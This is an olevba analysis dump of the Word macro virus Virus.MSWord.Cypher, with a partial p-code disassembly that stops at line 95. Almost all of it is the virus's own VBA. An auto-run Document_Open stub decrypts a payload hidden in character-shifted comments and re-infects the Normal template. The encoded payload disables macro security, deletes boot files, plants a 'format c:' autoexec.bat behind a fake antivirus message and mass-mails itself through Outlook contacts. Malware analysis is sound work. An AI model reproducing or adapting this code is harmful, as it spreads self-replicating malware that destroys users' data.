olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cypher
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: Virus.MSWord.Cypher - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Dim M(2) As Variant: Dim L(8) As Byte
    Set M(1) = ActiveDocument.VBProject.VBComponents.Item(1)
    Set M(2) = NormalTemplate.VBProject.VBComponents.Item(1)
    Set CM = M(1).CodeModule
    LinBeg = 33
    Line1 = CM.Lines(LinBeg, 1)
    L(1) = 1: n = 1 + LinBeg: CC = CM.Lines(LinBeg, CM.CountOfLines - LinBeg)
    For I = 2 To 8
        L(I) = Mid(Line1, I, 1)
    Next
    Do While InStr(CM.Lines(n, 1), ": End" + " Sub") = False
        CypLinen = CM.Lines(n, 1)
        Linen = ""
        For k = 2 To Len(CypLinen)
            o = Asc(Mid(CypLinen, k, 1))
            j = Int(o / 32) + 1
            I = 1
            Do While (j <> L(I))
                I = I + 1
            Loop
            nc = o - 32 * (L(I) - I)
            Linen = Linen + Chr(nc)
        Next
        CM.ReplaceLine n, Linen: n = n + 1
    Loop
    CM.DeleteLines LinBeg
    IDHMO (M)
    CM.DeleteLines LinBeg, CM.CountOfLines - LinBeg: CM.InsertLines LinBeg, CC:    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub IDHMO(M As Variant)
'6283457
'    /î %òòïò 2åóõíå .åøô
'    )æ 3ùóôåí®0òéöáôå0òïæéìå3ôòéîç¨¢¢¬ ¢(+%9?#522%.4?53%2<3ïæô÷áòå<-éãòïóïæô</ææéãå<¹®°<7ïòä<3åãõòéôù¢¬ ¢,åöåì¢© ¼¾ ¢¢ 4èåî 3ùóôåí®0òéöáôå0òïæéìå3ôòéîç¨¢¢¬ ¢(+%9?#522%.4?53%2<3ïæô÷áòå<-éãòïóïæô</ææéãå<¹®°<7ïòä<3åãõòéôù¢¬ ¢,åöåì¢© ½ ±
'    #ïííáîä"áòó¨¢4ïïìó¢©®#ïîôòïìó¨¢-áãòï¢©®%îáâìåä ½ &áìóåº /ðôéïîó®#ïîæéòí#ïîöåòóéïîó ½ &áìóåº /ðôéïîó®6éòõó0òïôåãôéïî ½ &áìóåº /ðôéïîó®3áöå.ïòíáì0òïíðô ½ &áìóå
'    3åô æó ½ #òåáôå/âêåãô¨¢3ãòéðôéîç®&éìå3ùóôåí/âêåãô¢©
'    3åô & ½ æó®'åô&éìå¨.ïòíáì4åíðìáôå®&õìì.áíå©º &®!ôôòéâõôåó ½ °
')æ $áôå ¾ £·¯±·¯°°£ 4èåî   §éô ó íù âéòôèäáù ¡
'    )æ !ððìéãáôéïî®5óåò.áíå ¼¾ ¢þþþ!îçåì¢ 4èåî
'        æó®$åìåôå&éìå ¢#º<éï®óùó¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<ãïîæéç®óùó¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<!õôïåøåã®âáô¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<7éîäï÷ó<÷éî®ãïí¢¬ 4òõåº
'        )æ )î3ôò¨!ððìéãáôéïî®5óåò.áíå¬ ¢ëè¢© ½ 4òõå 4èåî
'            3åô áõ ½ æó®#òåáôå4åøô&éìå¨¢#º<áõôïåøåã®âáô¢¬ 4òõå©
'            áõ®7òéôå,éîå ¨¢ åãèï ïææ¢©
'            áõ®7òéôå,éîå ¨¢ åãèï 9ïõò #ïíðõôåò éó âåéîç ãèåãëåä âù ùïõò !îôé6éòõó ­ 0ìåáóå 7áéô ­¢©
'            áõ®7òéôå,éîå ¨¢ åãèï þþþ!îçåì¢©
'            áõ®7òéôå,éîå ¨¢æïòíáô ãº ¯áõôïôåóô ¯ñ ¯õ¢©
'            áõ®#ìïóå
'        %îä )æ
'    %îä )æ
'    )æ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©®.áíå ½ ¢4èéó$ïã¢ 4èåî
'        3åô /, ½ #òåáôå/âêåãô¨¢/õôìïïë®!ððìéãáôéïî¢©
'        3åô -. ½ /,®'åô.áíå3ðáãå¨¢-!0)¢©º -.®,ïçïîº 3åô /- ½ /,®#òåáôå)ôåí¨ïì-áéì)ôåí©
'        &ïò á ½ ± 4ï -.®!ääòåóó,éóôó®#ïõîô
'            2áîäïíéúå 4éíåò
'            )æ -.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ¾ ¸ 4èåî
'                &ïò ò ½ ± 4ï )îô¨-.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ¯ ¸©
'                    4áòçåô ½ )îô¨± « -.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ª 2îä©
'                    /-®2åãéðéåîôó®!ää ¨-.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó¨4áòçåô©©
'                .åøô
'            %îä )æ
'        .åøô
'        7éôè /-
'            3åô 2åã ½ ®2åãéðéåîôó®!ää¨¢ïõôìïïë¹·?²°°° èïôíáéì®ãïí¾¢©º 2åã®2åóïìöå
'            ®3õâêåãô ½ !ãôéöå$ïãõíåîô®.áíåº ®"ïäù ½ !ððìéãáôéïî®5óåò.áíå ¦ öâ#ò,æ ¦ !ððìéãáôéïî®5óåò!ääòåóó ¦ öâ#ò,æ ¦ öâ#ò,æº ®!ôôáãèíåîôó®!ää !ãôéöå$ïãõíåîô®&õìì.áíåº ®3åîä
'        %îä 7éôè
'        -.®,ïçïææ
'        3åô /, ½ .ïôèéîç
'    %îä )æ
'%îä )æ
'    .â,± ½ -¨±©®#ïäå-ïäõìå®#ïõîô/æ,éîåó
'    .â,² ½ -¨²©®#ïäå-ïäõìå®#ïõîô/æ,éîåó
'    ).&? ½ &áìóåº ,éî"åç ½ ³³
'    )æ -¨²©®.áíå ¼¾ ¢4èéó$ïã¢ 4èåî
'        )æ .â,² ¾ ° 4èåî
'            -¨²©®#ïäå-ïäõìå®$åìåôå,éîåó ±¬ .â,²
'        %îä )æ
'        -¨²©®.áíå ½ ¢4èéó$ïã¢º ).& ½ 4òõå
'    %îä )æ
'    )æ ).& ½ &áìóå 4èåî 'ï4ï #2904?
'    .å÷.áíå ½ ¢¢
'    2áîäïíéúå 4éíåò
'    &ïò ) ½ ± 4ï µ
'        .å÷.áíå ½ .å÷.áíå « #èò¨)îô¨¶µ « ¨²µ ª 2îä©©©
'    .åøô
'    )æ )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨±¬ ±©¬ ¢/ðåî¢© 4èåî
'        -¨²©®#ïäå-ïäõìå®!ää&òïí3ôòéîç ¢0òéöáôå 3õâ $ïãõíåîô?#ìïóå¨©¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ²¬ ¢    /î %òòïò 2åóõíå .åøô¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ³¬ ¢    $éí -¨²© !ó 6áòéáîôº $éí ,¨¸© !ó "ùôå¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ´¬ ¢    3åô -¨²© ½ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó µ¬ ¢    3åô -¨±© ½ .ïòíáì4åíðìáôå®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢
'        ,éîå ½ ¶
'        $ï 7èéìå )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©¬ ¢$åìåôå¢© ½ &áìóå
'            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±
'        ,ïïð
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    #-®$åìåôå,éîåó ,éî"åç¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « .å÷.áíå « ¢¨-©¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « ¢#-®$åìåôå,éîåó ,éî"åç¬ #-®#ïõîô/æ,éîåó ­ ,éî"åçº #-®)îóåòô,éîåó ,éî"åç¬ ##º    !ãôéöå$ïãõíåîô®3áöå!ó &éìå.áíåº½!ãôéöå$ïãõíåîô®&õìì.áíå¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢%îä 3õâ¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢3õâ ¢ « .å÷.áíå « ¢¨- !ó 6áòéáîô©¢º ,éîå ½ ,éîå « ±
'        $ï 7èéìå -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±© ¼¾ ¢¢
'            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±
'        ,ïïð
'    %ìóå)æ )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨±¬ ±©¬ ¢#ìïóå¢© 4èåî
'        -¨²©®#ïäå-ïäõìå®!ää&òïí3ôòéîç ¢0òéöáôå 3õâ $ïãõíåîô?/ðåî¨©¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ²¬ ¢    /î %òòïò 2åóõíå .åøô¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ³¬ ¢    $éí -¨²© !ó 6áòéáîôº $éí ,¨¸© !ó "ùôå¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ´¬ ¢    3åô -¨±© ½ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó µ¬ ¢    3åô -¨²© ½ .ïòíáì4åíðìáôå®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢
'        ,éîå ½ ¶
'        $ï 7èéìå )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©¬ ¢$åìåôå¢© ½ &áìóå
'            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±
'        ,ïïð
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    #-®$åìåôå,éîåó ,éî"åç¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « .å÷.áíå « ¢¨-©¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    ¢ « ¢#-®$åìåôå,éîåó ,éî"åç¬ #-®#ïõîô/æ,éîåó ­ ,éî"åçº #-®)îóåòô,éîåó ,éî"åç¬ ##º    !ãôéöå$ïãõíåîô®3áöå!ó &éìå.áíåº½!ãôéöå$ïãõíåîô®&õìì.áíå¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢%îä 3õâ¢º ,éîå ½ ,éîå « ±
'        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢3õâ ¢ « .å÷.áíå « ¢¨- !ó 6áòéáîô©¢º ,éîå ½ ,éîå « ±
'        $ï 7èéìå -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±© ¼¾ ¢¢
'            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±
'        ,ïïð
'    %îä )æ
'#2904?º
'    $éí ,¨¸© !ó "ùôå
'    )æ ).& ½ &áìóå 4èåî 'ï4ï %.$?
'    2áîäïíéúå 4éíåò
'    ,¨±© ½ ±
'    &ïò ) ½ ² 4ï ¸
'        &ïõîä ½ &áìóå
'        )ôåò ½ °
'        $ï 7èéìå &ïõîä ½ &áìóå
'                )ôåò ½ )ôåò « ±
'                î ½ )îô¨¨¸ ª 2îä© « ±©
'                )æ î ¼¾ ) /ò )ôåò ¾ ±µ 4èåî
'                    ê ½ ±
'                    $ï 7èéìå ¨,¨ê© ¼¾ î© !îä ê ¼ )
'                        ê ½ ê « ±
'                    ,ïïð
'                    )æ ê ½ ) 4èåî
'                        &ïõîä ½ 4òõå
'                        ,¨)© ½ î
'                    %îä )æ
'                %îä )æ
'        ,ïïð
'    .åøô
'    ê ½ ,éî"åç
'    $éí #ùðèåò !ó 3ôòéîçº #ùðèåò ½ ¢¢
'    $ï 7èéìå )î3ôò¨-¨²©®#ïäå-ïäõìå®,éîåó¨ê¬ ±©¬ ¢º %îä ¢ « ¢3õâ¢© ½ &áìóå
'        ,éîåê ½ -¨²©®#ïäå-ïäõìå®,éîåó¨ê¬ ±©
'        #ùð,éîåê ½ ¢§¢
'        &ïò ë ½ ± 4ï ,åî¨,éîåê©
'            ï ½ !óã¨-éä¨,éîåê¬ ë¬ ±©©
'            ) ½ )îô¨ï ¯ ³²© « ±
'            # ½ ³² ª ¨,¨)© ­ )© « ï
'            #ùð,éîåê ½ #ùð,éîåê « #èò¨#©
'        .åøô
'        #ùðèåò ½ #ùðèåò « #ùð,éîåê « #èò¨±³©
'        ê ½ ê « ±
'    ,ïïð
'    +å ½ ¢¢
'    &ïò ) ½ ² 4ï ¸
'        +å ½ +å « &ïòíáô¨,¨)©©
'    .åøô
'    -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éî"åç¬ ¢§¢ « +å
'    -¨²©®#ïäå-ïäõìå®$åìåôå,éîåó ,éî"åç « ±¬ -¨²©®#ïäå-ïäõìå®#ïõîô/æ,éîåó ­ ,éî"åç
'    -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éî"åç « ±¬ #ùðèåò « ¢º %îä¢ « ¢ 3õâ¢
'%.$?º
: End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cypher
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDoc - 15577 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn M (As Variant)
' 	BoS 0x0000 
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0008 
' 	VarDefn L (As Byte)
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSet M 0x0001 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSet M 0x0001 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsLd M 0x0001 
' 	MemLd CodeModule 
' 	Set CM 
' Line #6:
' 	LitDI2 0x0021 
' 	St LinBeg 
' Line #7:
' 	Ld LinBeg 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St Line1 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt L 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld LinBeg 
' 	Add 
' 	St n 
' 	BoS 0x0000 
' 	Ld LinBeg 
' 	Ld CM 
' 	MemLd CountOfLines 
' 	Ld LinBeg 
' 	Sub 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St CC 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	For 
' Line #10:
' 	Ld Line1 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld I 
' 	ArgsSt L 0x0001 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 ": End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	FnInStr 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #13:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St CypLinen 
' Line #14:
' 	LitStr 0x0000 ""
' 	St Linen 
' Line #15:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld CypLinen 
' 	FnLen 
' 	For 
' Line #16:
' 	Ld CypLinen 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St o 
' Line #17:
' 	Ld o 
' 	LitDI2 0x0020 
' 	Div 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #18:
' 	LitDI2 0x0001 
' 	St I 
' Line #19:
' 	Ld j 
' 	Ld I 
' 	ArgsLd L 0x0001 
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #20:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #21:
' 	Loop 
' Line #22:
' 	Ld o 
' 	LitDI2 0x0020 
' 	Ld I 
' 	ArgsLd L 0x0001 
' 	Ld I 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Sub 
' 	St nc 
' Line #23:
' 	Ld Linen 
' 	Ld nc 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Linen 
' Line #24:
' 	StartForVariable 
' 	Next 
' Line #25:
' 	Ld n 
' 	Ld Linen 
' 	Ld CM 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #26:
' 	Loop 
' Line #27:
' 	Ld LinBeg 
' 	Ld CM 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #28:
' 	Ld M 
' 	Paren 
' 	ArgsCall IDHMO 0x0001 
' Line #29:
' 	Ld LinBeg 
' 	Ld CM 
' 	MemLd CountOfLines 
' 	Ld LinBeg 
' 	Sub 
' 	Ld CM 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld LinBeg 
' 	Ld CC 
' 	Ld CM 
' 	ArgsMemCall InsertLines 0x0002 
' 	BoS 0x0053 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub IDHMO(M As Variant))
' Line #32:
' 	QuoteRem 0x0000 0x0007 "6283457"
' Line #33:
' 	QuoteRem 0x0000 0x0018 "    /î %òòïò 2åóõíå .åøô"
' Line #34:
' 	QuoteRem 0x0000 0x00E9 "    )æ 3ùóôåí®0òéöáôå0òïæéìå3ôòéîç¨¢¢¬ ¢(+%9?#522%.4?53%2<3ïæô÷áòå<-éãòïóïæô</ææéãå<¹®°<7ïòä<3åãõòéôù¢¬ ¢,åöåì¢© ¼¾ ¢¢ 4èåî 3ùóôåí®0òéöáôå0òïæéìå3ôòéîç¨¢¢¬ ¢(+%9?#522%.4?53%2<3ïæô÷áòå<-éãòïóïæô</ææéãå<¹®°<7ïòä<3åãõòéôù¢¬ ¢,åöåì¢© ½ ±"
' Line #35:
' 	QuoteRem 0x0000 0x00A1 "    #ïííáîä"áòó¨¢4ïïìó¢©®#ïîôòïìó¨¢-áãòï¢©®%îáâìåä ½ &áìóåº /ðôéïîó®#ïîæéòí#ïîöåòóéïîó ½ &áìóåº /ðôéïîó®6éòõó0òïôåãôéïî ½ &áìóåº /ðôéïîó®3áöå.ïòíáì0òïíðô ½ &áìóå"
' Line #36:
' 	QuoteRem 0x0000 0x0037 "    3åô æó ½ #òåáôå/âêåãô¨¢3ãòéðôéîç®&éìå3ùóôåí/âêåãô¢©"
' Line #37:
' 	QuoteRem 0x0000 0x0041 "    3åô & ½ æó®'åô&éìå¨.ïòíáì4åíðìáôå®&õìì.áíå©º &®!ôôòéâõôåó ½ °"
' Line #38:
' 	QuoteRem 0x0000 0x002E ")æ $áôå ¾ £·¯±·¯°°£ 4èåî   §éô ó íù âéòôèäáù ¡"
' Line #39:
' 	QuoteRem 0x0000 0x002E "    )æ !ððìéãáôéïî®5óåò.áíå ¼¾ ¢þþþ!îçåì¢ 4èåî"
' Line #40:
' 	QuoteRem 0x0000 0x009E "        æó®$åìåôå&éìå ¢#º<éï®óùó¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<ãïîæéç®óùó¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<!õôïåøåã®âáô¢¬ 4òõåº æó®$åìåôå&éìå ¢#º<7éîäï÷ó<÷éî®ãïí¢¬ 4òõåº"
' Line #41:
' 	QuoteRem 0x0000 0x0038 "        )æ )î3ôò¨!ððìéãáôéïî®5óåò.áíå¬ ¢ëè¢© ½ 4òõå 4èåî"
' Line #42:
' 	QuoteRem 0x0000 0x003F "            3åô áõ ½ æó®#òåáôå4åøô&éìå¨¢#º<áõôïåøåã®âáô¢¬ 4òõå©"
' Line #43:
' 	QuoteRem 0x0000 0x0026 "            áõ®7òéôå,éîå ¨¢ åãèï ïææ¢©"
' Line #44:
' 	QuoteRem 0x0000 0x0063 "            áõ®7òéôå,éîå ¨¢ åãèï 9ïõò #ïíðõôåò éó âåéîç ãèåãëåä âù ùïõò !îôé6éòõó ­ 0ìåáóå 7áéô ­¢©"
' Line #45:
' 	QuoteRem 0x0000 0x002B "            áõ®7òéôå,éîå ¨¢ åãèï þþþ!îçåì¢©"
' Line #46:
' 	QuoteRem 0x0000 0x0036 "            áõ®7òéôå,éîå ¨¢æïòíáô ãº ¯áõôïôåóô ¯ñ ¯õ¢©"
' Line #47:
' 	QuoteRem 0x0000 0x0014 "            áõ®#ìïóå"
' Line #48:
' 	QuoteRem 0x0000 0x000E "        %îä )æ"
' Line #49:
' 	QuoteRem 0x0000 0x000A "    %îä )æ"
' Line #50:
' 	QuoteRem 0x0000 0x004A "    )æ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©®.áíå ½ ¢4èéó$ïã¢ 4èåî"
' Line #51:
' 	QuoteRem 0x0000 0x0034 "        3åô /, ½ #òåáôå/âêåãô¨¢/õôìïïë®!ððìéãáôéïî¢©"
' Line #52:
' 	QuoteRem 0x0000 0x0056 "        3åô -. ½ /,®'åô.áíå3ðáãå¨¢-!0)¢©º -.®,ïçïîº 3åô /- ½ /,®#òåáôå)ôåí¨ïì-áéì)ôåí©"
' Line #53:
' 	QuoteRem 0x0000 0x002A "        &ïò á ½ ± 4ï -.®!ääòåóó,éóôó®#ïõîô"
' Line #54:
' 	QuoteRem 0x0000 0x001B "            2áîäïíéúå 4éíåò"
' Line #55:
' 	QuoteRem 0x0000 0x003F "            )æ -.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ¾ ¸ 4èåî"
' Line #56:
' 	QuoteRem 0x0000 0x004D "                &ïò ò ½ ± 4ï )îô¨-.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ¯ ¸©"
' Line #57:
' 	QuoteRem 0x0000 0x0053 "                    4áòçåô ½ )îô¨± « -.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó®#ïõîô ª 2îä©"
' Line #58:
' 	QuoteRem 0x0000 0x0051 "                    /-®2åãéðéåîôó®!ää ¨-.®!ääòåóó,éóôó¨á©®!ääòåóó%îôòéåó¨4áòçåô©©"
' Line #59:
' 	QuoteRem 0x0000 0x0014 "                .åøô"
' Line #60:
' 	QuoteRem 0x0000 0x0012 "            %îä )æ"
' Line #61:
' 	QuoteRem 0x0000 0x000C "        .åøô"
' Line #62:
' 	QuoteRem 0x0000 0x000F "        7éôè /-"
' Line #63:
' 	QuoteRem 0x0000 0x0051 "            3åô 2åã ½ ®2åãéðéåîôó®!ää¨¢ïõôìïïë¹·?²°°° èïôíáéì®ãïí¾¢©º 2åã®2åóïìöå"
' Line #64:
' 	QuoteRem 0x0000 0x00AE "            ®3õâêåãô ½ !ãôéöå$ïãõíåîô®.áíåº ®"ïäù ½ !ððìéãáôéïî®5óåò.áíå ¦ öâ#ò,æ ¦ !ððìéãáôéïî®5óåò!ääòåóó ¦ öâ#ò,æ ¦ öâ#ò,æº ®!ôôáãèíåîôó®!ää !ãôéöå$ïãõíåîô®&õìì.áíåº ®3åîä"
' Line #65:
' 	QuoteRem 0x0000 0x0010 "        %îä 7éôè"
' Line #66:
' 	QuoteRem 0x0000 0x0011 "        -.®,ïçïææ"
' Line #67:
' 	QuoteRem 0x0000 0x0018 "        3åô /, ½ .ïôèéîç"
' Line #68:
' 	QuoteRem 0x0000 0x000A "    %îä )æ"
' Line #69:
' 	QuoteRem 0x0000 0x0006 "%îä )æ"
' Line #70:
' 	QuoteRem 0x0000 0x0027 "    .â,± ½ -¨±©®#ïäå-ïäõìå®#ïõîô/æ,éîåó"
' Line #71:
' 	QuoteRem 0x0000 0x0027 "    .â,² ½ -¨²©®#ïäå-ïäõìå®#ïõîô/æ,éîåó"
' Line #72:
' 	QuoteRem 0x0000 0x001D "    ).&? ½ &áìóåº ,éî"åç ½ ³³"
' Line #73:
' 	QuoteRem 0x0000 0x0022 "    )æ -¨²©®.áíå ¼¾ ¢4èéó$ïã¢ 4èåî"
' Line #74:
' 	QuoteRem 0x0000 0x0018 "        )æ .â,² ¾ ° 4èåî"
' Line #75:
' 	QuoteRem 0x0000 0x002F "            -¨²©®#ïäå-ïäõìå®$åìåôå,éîåó ±¬ .â,²"
' Line #76:
' 	QuoteRem 0x0000 0x000E "        %îä )æ"
' Line #77:
' 	QuoteRem 0x0000 0x0029 "        -¨²©®.áíå ½ ¢4èéó$ïã¢º ).& ½ 4òõå"
' Line #78:
' 	QuoteRem 0x0000 0x000A "    %îä )æ"
' Line #79:
' 	QuoteRem 0x0000 0x0023 "    )æ ).& ½ &áìóå 4èåî 'ï4ï #2904?"
' Line #80:
' 	QuoteRem 0x0000 0x0010 "    .å÷.áíå ½ ¢¢"
' Line #81:
' 	QuoteRem 0x0000 0x0013 "    2áîäïíéúå 4éíåò"
' Line #82:
' 	QuoteRem 0x0000 0x0012 "    &ïò ) ½ ± 4ï µ"
' Line #83:
' 	QuoteRem 0x0000 0x0035 "        .å÷.áíå ½ .å÷.áíå « #èò¨)îô¨¶µ « ¨²µ ª 2îä©©©"
' Line #84:
' 	QuoteRem 0x0000 0x0008 "    .åøô"
' Line #85:
' 	QuoteRem 0x0000 0x0036 "    )æ )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨±¬ ±©¬ ¢/ðåî¢© 4èåî"
' Line #86:
' 	QuoteRem 0x0000 0x0044 "        -¨²©®#ïäå-ïäõìå®!ää&òïí3ôòéîç ¢0òéöáôå 3õâ $ïãõíåîô?#ìïóå¨©¢"
' Line #87:
' 	QuoteRem 0x0000 0x0041 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ²¬ ¢    /î %òòïò 2åóõíå .åøô¢"
' Line #88:
' 	QuoteRem 0x0000 0x0052 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ³¬ ¢    $éí -¨²© !ó 6áòéáîôº $éí ,¨¸© !ó "ùôå¢"
' Line #89:
' 	QuoteRem 0x0000 0x0065 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ´¬ ¢    3åô -¨²© ½ !ãôéöå$ïãõíåîô®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢"
' Line #90:
' 	QuoteRem 0x0000 0x0065 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó µ¬ ¢    3åô -¨±© ½ .ïòíáì4åíðìáôå®6"0òïêåãô®6"#ïíðïîåîôó®)ôåí¨±©¢"
' Line #91:
' 	QuoteRem 0x0000 0x0010 "        ,éîå ½ ¶"
' Line #92:
' 	QuoteRem 0x0000 0x0048 "        $ï 7èéìå )î3ôò¨-¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©¬ ¢$åìåôå¢© ½ &áìóå"
' Line #93:
' 	QuoteRem 0x0000 0x005D "            -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ -¨±©®#ïäå-ïäõìå®,éîåó¨,éîå¬ ±©º ,éîå ½ ,éîå « ±"
' Line #94:
' 	QuoteRem 0x0000 0x000C "        ,ïïð"
' Line #95:
' 	QuoteRem 0x0000 0x0056 "        -¨²©®#ïäå-ïäõìå®)îóåòô,éîåó ,éîå¬ ¢    #-®$åìåôå,éîåó ,éî"åç¢º ,éîå ½ ,éîå « ±"
' Line #96:
